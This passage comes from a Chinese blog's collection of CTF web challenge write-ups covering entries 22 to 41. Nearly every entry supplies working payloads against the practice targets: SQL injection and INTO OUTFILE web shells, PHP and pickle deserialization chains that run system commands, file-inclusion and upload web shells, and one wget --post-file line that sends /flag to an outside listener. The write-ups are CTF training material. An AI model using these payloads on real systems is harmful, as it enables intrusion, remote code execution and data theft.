1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;Index&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;servlet&gt; &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;IndexController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Index&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;LoginController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Login&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Download&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 找到flag的位置构造payload 1/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 在下载的文件中找到一串base64加密后的字符串 （因为是等号结尾 1ZmxhZ3swYWZkMTE1NC1jNTE0LTQzYTUtODY4YS02NjMxODkzMTg3ZWN9Cg== 解密后即得到flag 22、[网鼎杯 2018]Fakebook发现有robots.txt 访问 12User-agent: *Disallow: /user.php.bak 访问后得到源码的备份文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 可以看到注册时blog的填写必须要http开头的网址注册成功后点进去 发现url是 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=1 猜测no存在sql注入fuzz后发现select 和 union都没被过滤 猜测是空格被过滤 使用&#x2F; ** &#x2F;绕过联合查询爆出表的长度 并且知道回显位是2 同时发现存在反序列化 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,2,3,4 继续获得数据库名称 fakebook 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,database(),3,4 继续获得表名 users 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,TABLE_NAME,3,4 FROM information_schema.tables WHERE TABLE_SCHEMA=database() 继续获取列名|no,username,passwd,data| 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(column_name),3,4 from information_schema.columns WHERE TABLE_SCHEMA=database() 获取字段 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select%201,GROUP_CONCAT(no,username,passwd,data),3,4 from users 回显 11adminc7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ecO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:15:&quot;http://fasd.com&quot;;&#125;v 我们猜测flag也在报错的当前目录下 1/var/www/html/view.php 方法一：ssrf漏洞payload如下 因为data字段在第4个位置 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; 在源码中发现了flag 12345&lt;!--?php$flag = &quot;flag&#123;1c940269-22ec-4be3-9486-e4a4d10e2474&#125;&quot;;exit(0);--&gt; 方法二：load_file函数payload 1http://e639aa32-ade1-4c1e-b515-fbcf82155e81.node5.buuoj.cn:81/view.php?no=-1%20union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4 同样能找到flag 23、[NewStarCTF 2023 公开赛道]Include 🍐题目代码 123456789101112&lt;?php error_reporting(0); if(isset($_GET[&#x27;file&#x27;])) &#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123; die(&#x27;hacker!&#x27;); &#125; include($file.&quot;.php&quot;); # Something in phpinfo.php! &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 过滤了常见的文件包含协议 但是可以传入参数file使用file协议查看 1?file=file:///var/www/html/phpinfo 搜索flag 找到 1|fake&#123;Check_register_argc_argv&#125;| 继续查找register_argc_argv 发现两个on构造payload 使用burp抓包传参 1?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+nene.php 最后访问 1/nene.php POST方法传入参数 即可获得flag 11=cat /f* 24、[VNCTF2023]象棋王子查看源代码 发现有jsfuck加密复制下来 在控制台跑一下 即可 25、[NewStarCTF 2023 公开赛道]Begin of PHP题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;key1&#x27;]) &amp;&amp; isset($_GET[&#x27;key2&#x27;]))&#123; echo &quot;=Level 1=&lt;br&gt;&quot;; if($_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;] &amp;&amp; md5($_GET[&#x27;key1&#x27;]) == md5($_GET[&#x27;key2&#x27;]))&#123; $flag1 = True; &#125;else&#123; die(&quot;nope,this is level 1&quot;); &#125;&#125;if($flag1)&#123; echo &quot;=Level 2=&lt;br&gt;&quot;; if(isset($_POST[&#x27;key3&#x27;]))&#123; if(md5($_POST[&#x27;key3&#x27;]) === sha1($_POST[&#x27;key3&#x27;]))&#123; $flag2 = True; &#125; &#125;else&#123; die(&quot;nope,this is level 2&quot;); &#125;&#125;if($flag2)&#123; echo &quot;=Level 3=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key4&#x27;]))&#123; if(strcmp($_GET[&#x27;key4&#x27;],file_get_contents(&quot;/flag&quot;)) == 0)&#123; $flag3 = True; &#125;else&#123; die(&quot;nope,this is level 3&quot;); &#125; &#125;&#125;if($flag3)&#123; echo &quot;=Level 4=&lt;br&gt;&quot;; if(isset($_GET[&#x27;key5&#x27;]))&#123; if(!is_numeric($_GET[&#x27;key5&#x27;]) &amp;&amp; $_GET[&#x27;key5&#x27;] &gt; 2023)&#123; $flag4 = True; &#125;else&#123; die(&quot;nope,this is level 4&quot;); &#125; &#125;&#125;if($flag4)&#123; echo &quot;=Level 5=&lt;br&gt;&quot;; extract($_POST); foreach($_POST as $var)&#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123; die(&quot;nope,this is level 5&quot;); &#125; &#125; if($flag5)&#123; echo file_get_contents(&quot;/flag&quot;); &#125;else&#123; die(&quot;nope,this is level 5&quot;); &#125;&#125; 感觉可以大量使用数组进行绕过 注意GET&#x2F;POST方法前面四部分都可利用弱比较的特性 使用数组绕过最后一部分 extract函数的绕过方法 POST 1flag5=. 这是因为要求flag5参数的值不包含[a-zA-Z0-9]，即不包含字母和数字，用字符绕过即可。 26、[NewStarCTF 2023 公开赛道]include 0。0题目源码 12345678910&lt;?phphighlight_file(__FILE__);// FLAG in the flag.php$file = $_GET[&#x27;file&#x27;];if(isset($file) &amp;&amp; !preg_match(&#x27;/base|rot/i&#x27;,$file))&#123; @include($file);&#125;else&#123; die(&quot;nope&quot;);&#125;?&gt; nope GET传参获取file 应该是用php伪协议读取文件 过滤了base64和rot13两种方式那就使用十六进制 1?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 27、[NewStarCTF 2023 公开赛道]R!C!E!题目源码 1234567891011&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123; $password=md5($_POST[&#x27;password&#x27;]); $code=$_POST[&#x27;e_v.a.l&#x27;]; if(substr($password,0,6)===&quot;c4d038&quot;)&#123; if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123; eval($code); &#125; &#125;&#125; 最终payload 1password=6O48A7ZyA0nskVwOIGCQ&amp;e[v.a.l=echo(`cd /;l\\s;more f?*?;`); 说明：password参数的要求：md5加密后前六位要满足c4d038e_v.a.l参数需要注意的地方：在POST的时候e_v.a.l中的.会被解析为_绕过方式：e[v.a.l这样[ 会被解析成_ 而后面的逗号不会被解析 28、[NewStarCTF 2023 公开赛道]Unserialize？题目源码 12345678910111213141516&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123; private $cmd; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;?&gt; 测试脚本 1234567891011121314151617&lt;?phpclass evil &#123; private $cmd=&#x27;ls /&#x27;; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil()echo urlencode(serialize(a))?&gt; 因为cat被屏蔽了 使用uniq可以绕过 1234567891011121314151617&lt;?phpclass evil &#123; private $cmd=&#x27;uniq /th1s_1s_fffflllll4444aaaggggg&#x27;; public function __destruct() &#123; if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123; @system($this-&gt;cmd); &#125; &#125;&#125;$a = new evil()echo urlencode(serialize(a))?&gt; 29、[NewStarCTF 2023 公开赛道]POP Gadget题目源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phphighlight_file(__FILE__);class Begin&#123; public $name; public function __destruct() &#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123; echo &quot;Hello&quot;; &#125;else&#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func; public $var; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); &#125;&#125;@unserialize($_POST[&#x27;pop&#x27;]); 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?phpclass Begin&#123; public $name; public function __destruct() &#123; if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123; echo &quot;Hello&quot;; &#125;else&#123; echo &quot;Welcome to NewStarCTF 2023!&quot;; &#125; &#125;&#125;class Then&#123; private $func; public function __construct() &#123; $a=new Super(); $this-&gt;func=$a; &#125;//构造一个构造方法 来进行触发Super里面的__invoke()魔术方法 因为private（）函数原因 类的内部能够访问 但外部不能访问 public function __toString() &#123; ($this-&gt;func)(); return &quot;Good Job!&quot;; &#125;&#125;class Handle&#123; protected $obj; public function __construct() &#123; $this-&gt;obj=new CTF(); &#125;//构造一个构造方法 进入CTF的内部 因为protected（）函数原因 子类能够访问 但外部不能访问 public function __call($func, $vars) &#123; $this-&gt;obj-&gt;end(); &#125;&#125;class Super&#123; protected $obj; public function __construct() &#123; $this-&gt;obj=new Handle(); &#125; //构造一个构造方法 来进行触发Handle里面的__call（）魔术方法 因为protected（）函数原因 子类能够访问 但外部不能访问 public function __invoke() &#123; $this-&gt;obj-&gt;getStr(); &#125; public function end() &#123; die(&quot;==GAME OVER==&quot;); &#125;&#125;class CTF&#123; public $handle; public function __construct() &#123; $b=new WhiteGod(); $this-&gt;handle=$b; &#125; //自己创建构造函数 来触发下面的__unset()魔术方法 public function end() &#123; unset($this-&gt;handle-&gt;log); &#125;&#125;class WhiteGod&#123; public $func=&#x27;system&#x27;; //赋值来构造命令执行 public $var=&#x27;ls /&#x27;; public function __unset($var) &#123; ($this-&gt;func)($this-&gt;var); //出口函数 采用传参的拼接 可以执行命令执行漏洞 &#125;&#125;//pop链：__construct()-&gt;__tostring（）-&gt;__invoke()-&gt;__call（）-&gt;CTF()-&gt;__unset$k=new Begin(); //创建对象自动销毁触发__construct()魔术方法$k-&gt;name=new Then(); //触发__tostring（）魔术方法echo urlencode(serialize($k)); //url编码可以绕过私有属性和保护属性 或者采用%00来替补 最终payload POST方法提交 1pop=O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;%00*%00obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125; 30、[NewStarCTF 2023 公开赛道]EasyLogin爆破密码后得到密码是000000admin 000000 登陆成功抓包后发现302重定向页面在该页面发现flag 1234567891011HTTP/1.1 302 FoundDate: Wed, 31 Jan 2024 02:52:10 GMTServer: Apache/2.4.54 (Debian)X-Powered-By: PHP/7.4.30Set-Cookie: token=vyYcoj3oBPxcJynYjDB147AXacdZmh0kgkqJO9WvoHJ1aQtYOHBXIFfl1UbeoQucH6MgN5teTRk2ndV3Mwp0Ng%3D%3D; path=/Location: /Content-Length: 51Connection: closeContent-Type: text/html; charset=UTF-8&lt;!-- flag&#123;80287908-f5bc-44d8-aa80-3ec4ea9e331f&#125; --&gt; 31、[Dest0g3 520迎新赛]funny_upload.htaccess 注意上传的时候先上传.htaccess.jpg 再抓包修改名称 12AddType application/x-httpd-php .jpgphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot; 1.jpg 12PD9waHAgZXZhbCgkX1BPU1RbJ25lbmUnXSk7Pz4=# &lt;?php eval($_POST[&#x27;nene&#x27;]);?&gt; 之后蚁剑连接即可 32、[Dest0g3 520迎新赛]SimpleRCE无参数rce直接过 123POST：aaa=show_source(next(apache_request_headers()));User-Agent: /flag 33、[2022DASCTF MAY 出题人挑战赛]魔法浏览器在文档中发现 12let ua = &quot;\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35&quot;; console[&quot;\\x6c\\x6f\\x67&quot;](ua); 将utf-8转化为字符 或者 直接在控制台中输入 即可将utf-8字符直接转化为字符 1Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75 添加入浏览器的user-agent头即可 34、[DASCTF 2023 &amp; 0X401七月暑期挑战赛]ez_cms后台地址 1http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/ admin爆破出密码123456pearcmd文件包含使用burp传参 直接夹在url后会因为url编码导致写入的一句话无法正常解析 1+config-create+/&amp;r=../../../../../../../../../../usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[cmd]);?&gt;+../../../../../../../../tmp/1.php 之后蚁剑连接即可 1http://0baae324-999c-4467-afd4-d50da533a1e5.node5.buuoj.cn:81/admin/index.php?r=../../../../../../../../tmp/1.php 1flag&#123;9541dd35-dc88-493c-b5ae-ee4f61fe40d8&#125; 35、[Dest0g3 520迎新赛]middle题目源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [&#x27;config&#x27;] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route(&#x27;/&#x27;)def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def home(): data=request.form[&#x27;data&#x27;] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)import osdef backdoor(cmd): # 这里我也改了一下 if isinstance(cmd,list) : s=&#x27;&#x27;.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) pickel 反序列化payload 12345678import osimport configimport pickleimport sysimport base64opcode = b&#x27;&#x27;&#x27;(cconfig\\nbackdoor\\np0\\n0g0\\n((S&#x27;__import__(\\\\&#x27;os\\\\&#x27;).popen(\\\\&#x27;cat /flag.txt\\\\&#x27;).read()&#x27;\\nltR.&#x27;&#x27;&#x27;print(base64.b64encode(opcode)) 参数 1KGNjb25maWcKYmFja2Rvb3IKcDAKMGcwCigoUydfX2ltcG9ydF9fKFwnb3NcJykucG9wZW4oXCdjYXQgL2ZsYWcudHh0XCcpLnJlYWQoKScKbHRSLg== 36[2022DASCTF Apr X FATE 防疫挑战赛]warmup-php题目部分源码 123456789101112131415161718192021&lt;?phpspl_autoload_register(function($class)&#123; require(&quot;./class/&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action = $_GET[&#x27;action&#x27;];$properties = $_POST[&#x27;properties&#x27;];class Action&#123; public function __construct($action,$properties)&#123; $object=new $action(); foreach($properties as $name=&gt;$value) $object-&gt;$name=$value; $object-&gt;run(); &#125;&#125;new Action($action,$properties);?&gt; payloadGET参数 1action=TestView POST参数 1properties[template]=&#123;TableBody&#125;&amp;properties[rowHtmlOptionsExpression]=var_dump(system(&#x27;/readflag&#x27;));&amp;properties[data]=1 37、[2022DASCTF Apr X FATE 防疫挑战赛]soeasy_php（不会）考虑存在任意文件读取POST如下参数 1png=/var/www/html/upload.php&amp;flag=1 然后从&#x2F;upload&#x2F;head.png下载图片以文本打开 即可获得源码upload.php页面源码 1234567891011&lt;?phpif (!isset($_FILES[&#x27;file&#x27;])) &#123; die(&quot;请上传头像&quot;);&#125;$file = $_FILES[&#x27;file&#x27;];$filename = md5(&quot;png&quot;.$file[&#x27;name&#x27;]).&quot;.png&quot;;$path = &quot;uploads/&quot;.$filename;if(move_uploaded_file($file[&#x27;tmp_name&#x27;],$path))&#123; echo &quot;上传成功： &quot;.$path;&#125;; edit.php页面源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;function filewrite($file,$data)&#123; unlink($file); file_put_contents($file, $data);&#125;if(isset($_POST[&#x27;png&#x27;]))&#123; $filename = $_POST[&#x27;png&#x27;]; if(!preg_match(&quot;/:|phar|\\/\\/|php/im&quot;,$filename))&#123; $f = fopen($filename,&quot;r&quot;); $contents = fread($f, filesize($filename)); if(strpos($contents,&quot;flag&#123;&quot;) !== false)&#123; filewrite($filename,&quot;Don&#x27;t give me flag!!!&quot;); &#125; &#125; if(isset($_POST[&#x27;flag&#x27;])) &#123; $flag = (string)$_POST[&#x27;flag&#x27;]; if ($flag == &quot;Give me flag&quot;) &#123; filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don&#x27;t give me flag&quot;); sleep(2); die(&quot;no no no !&quot;); &#125; else &#123; filewrite(&quot;/tmp/flag.txt&quot;, $flag); //不给我看我自己写个flag。 &#125; $head = &quot;uploads/head.png&quot;; unlink($head); if (symlink($filename, $head)) &#123; echo &quot;成功更换头像&quot;; &#125; else &#123; unlink($filename); echo &quot;非正常文件，已被删除&quot;; &#125;; &#125;&#125; phar文件内容 123456789101112131415161718192021&lt;?phpclass flag&#123; public function copyflag()&#123; exec(&quot;/copyflag&quot;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo &quot;SFTQL&quot;; &#125; public function __destruct()&#123; $this-&gt;copyflag(); &#125;&#125;$a = new flag();@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;);$phar-&gt;stopBuffering(); 然后通过添加脏数据触发unlink 1phar://uploads/5a13b7b1b065e675e36187d2b4b69186.png/a.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 38、[陇原战”疫”2021网络安全大赛]CheckIN盲注得admin54a83850073b0f4c6862d5a1d48ea84f但是没啥用payload 1wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://192.168.237.128:7777/ kali上运行 1nc -lvp 7777 没有vps 再见了 39、[2021DASCTF实战精英夏令营暨DASCTF July X CBCTF 4th]cybercms发现后台&#x2F;admin&#x2F;login.phpbeescms漏洞payload user POST传参 1adm&#x27;/**/union/**/seselectlect/**/1,2,3,4,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e/**/into/**/outoutfilefile/**/&#x27;/var/www/html/nene.php 之后访问&#x2F;nene.phpPOST 12cmd=system(&#x27;ls /&#x27;);cmd=system(&#x27;cat /flag.txt&#x27;); 40、[NewStarCTF 公开赛赛道]又一个SQL123456#爆表名name=-1%0bunion%0bselect%0b(select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),2; #爆列名name=-1%0bunion%0bselect%0b(select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_comments&#x27;),2;# 爆字段-1%0bunion%0bselect%0b(select%0bgroup_concat(id,text,user,name,display)%0bfrom%0bwfy_comments%0blimit%0b0,1),2; 41、[BJDCTF2020]The mystery of ip找到提示 1&lt;!-- Do you know why i know your ip? --&gt; 发现是请求头存在注入 1X-Forwarded-For:&#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"}],"tags":[{"name":"CTF,Web","slug":"CTF-Web","permalink":"http://xxxkkk578.github.io/tags/CTF-Web/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"},{"name":"杂记","slug":"杂记","permalink":"http://xxxkkk578.github.io/categories/%E6%9D%82%E8%AE%B0/"}],"tags":[{"name":"CTF,Misc","slug":"CTF-Misc","permalink":"http://xxxkkk578.github.io/tags/CTF-Misc/"},{"name":"Literature","slug":"Literature","permalink":"http://xxxkkk578.github.io/tags/Literature/"},{"name":"CTF,Web","slug":"CTF-Web","permalink":"http://xxxkkk578.github.io/tags/CTF-Web/"}]}